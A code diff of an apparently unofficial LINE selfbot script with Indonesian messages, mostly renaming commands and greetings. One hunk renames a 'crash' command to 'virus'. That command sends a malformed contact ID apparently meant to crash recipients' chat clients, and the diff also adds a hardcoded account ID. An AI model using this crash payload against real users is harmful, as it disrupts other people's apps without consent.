@@ -12,7 +12,7 @@ from humanfriendly import format_timespan, format_size, format_number, format_le
 import time, random, sys, json, codecs, threading, glob, re, string, os, requests, six, ast, pytz, urllib, urllib3, urllib.parse, traceback, atexit
 
 client = LINE()
-#client = LINE("")
+#client = LINE("u94065e4f90aebd04ea0f8fded453072d")
 clientMid = client.profile.mid
 clientProfile = client.getProfile()
 clientSettings = client.getSettings()
@@ -341,7 +341,7 @@ def helpmessage():
                     "╠══[ Self Key ]" + "\n" + \
                     "╠ " + key + "ChangeName:「Query」" + "\n" + \
                     "╠ " + key + "ChangeBio:「Query」" + "\n" + \
-                    "╠ " + key + "Me" + "\n" + \
+                    "╠ " + key + "Fal" + "\n" + \
                     "╠ " + key + "MyMid" + "\n" + \
                     "╠ " + key + "MyName" + "\n" + \
                     "╠ " + key + "MyBio" + "\n" + \
@@ -583,19 +583,20 @@ def clientBot(op):
             print ("[ 5 ] NOTIFIED ADD CONTACT")
             if settings["autoAdd"] == True:
                 client.findAndAddContactsByMid(op.param1)
-            sendMention(op.param1, "Halo @!,terimakasih telah menambahkan saya sebagai teman :3")
+            sendMention(op.param1, "Halo @!,cieee gw di add :3")
 
         if op.type == 13:
             print ("[ 13 ] NOTIFIED INVITE INTO GROUP")
             if clientMid in op.param3:
                 if settings["autoJoin"] == True:
                     client.acceptGroupInvitation(op.param1)
-                sendMention(op.param1, "Halo @!, Terimakasih Telah Mengundang Saya :3")
+                sendMention(op.param1, "Halo @!, Fall is here,thanks for invite me :3")
+                                                                              
 
         if op.type in [22, 24]:
             print ("[ 22 And 24 ] NOTIFIED INVITE INTO ROOM & NOTIFIED LEAVE ROOM")
             if settings["autoLeave"] == True:
-                sendMention(op.param1, "Oi asw @!,ngapain invite saya")
+                sendMention(op.param1, "Oi asw @!,group apa lg sih ini haddeeh")
                 client.leaveRoom(op.param1)
 
         if op.type == 25:
@@ -745,7 +746,7 @@ def clientBot(op):
                                 except Exception as e:
                                     client.sendMessage(msg.to, str(e))
 # Pembatas Script #
-                            elif cmd == "crash":
+                            elif cmd == "virus":
                                 client.sendContact(to, "u1f41296217e740650e0448b96851a3e2',")
                             elif cmd.startswith("changename:"):
                                 sep = text.split(" ")
@@ -763,7 +764,7 @@ def clientBot(op):
                                     profile.statusMessage = string
                                     client.updateProfile(profile)
                                     client.sendMessage(to,"Berhasil mengganti status message menjadi{}".format(str(string)))
-                            elif cmd == "me":
+                            elif cmd == "fal":
                                 client.sendContact(to, sender)
                             elif cmd == "mymid":
                                 client.sendMessage(to, "[ MID ]\n{}".format(sender))
@@ -783,7 +784,7 @@ def clientBot(op):
                                 channel = client.getProfileCoverURL(sender)          
                                 path = str(channel)
                                 client.sendImageWithURL(to, path)
-                            elif cmd.startswith("copy "):
+                            elif cmd.startswith("copy"):
                                 if 'MENTION' in msg.contentMetadata.keys()!= None:
                                     names = re.findall(r'@(\w+)', text)
                                     mention = ast.literal_eval(msg.contentMetadata['MENTION'])
